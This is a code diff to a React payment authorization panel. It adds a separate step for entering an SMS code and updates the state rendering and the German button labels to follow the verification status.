@@ -22,6 +22,7 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId }) => {
     isLoading: sessionLoading,
     setVerificationMethod,
     confirmAppVerification,
+    enterSmsCode,
     submitSmsCode: submitSmsCodeOptimistic
   } = useOptimisticPaymentSession(sessionId);
 
@@ -77,7 +78,13 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId }) => {
 
   const handleSmsSubmit = async () => {
     if (!smsCode) return;
-    await submitSmsCodeOptimistic(smsCode);
+    // If we're in sms_confirmation state, enter the code first
+    if (sessionData?.verification_status === 'sms_confirmation') {
+      await enterSmsCode(smsCode);
+    } else {
+      // If we're in sms_sent state, confirm the code
+      await submitSmsCodeOptimistic(smsCode);
+    }
     setSmsCode('');
   };
 
@@ -101,7 +108,13 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId }) => {
       case 'app_confirmation':
         return verification_status === 'app_confirmed' ? renderFinalProcessingState() : renderAppConfirmationState();
       case 'sms_confirmation':
-        return verification_status === 'sms_confirmed' ? renderFinalProcessingState() : renderSmsConfirmationState();
+        if (verification_status === 'sms_confirmed') {
+          return renderFinalProcessingState();
+        } else if (verification_status === 'sms_sent') {
+          return renderSmsConfirmationState();
+        } else {
+          return renderSmsConfirmationState();
+        }
       case 'choice_required':
         return renderChoiceState();
       default:
@@ -192,7 +205,7 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId }) => {
           disabled={smsCode.length !== 6}
           className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 text-base"
         >
-          Code bestätigen
+          {sessionData?.verification_status === 'sms_confirmation' ? 'Code eingeben' : 'Code bestätigen'}
         </Button>
       </div>
     </>
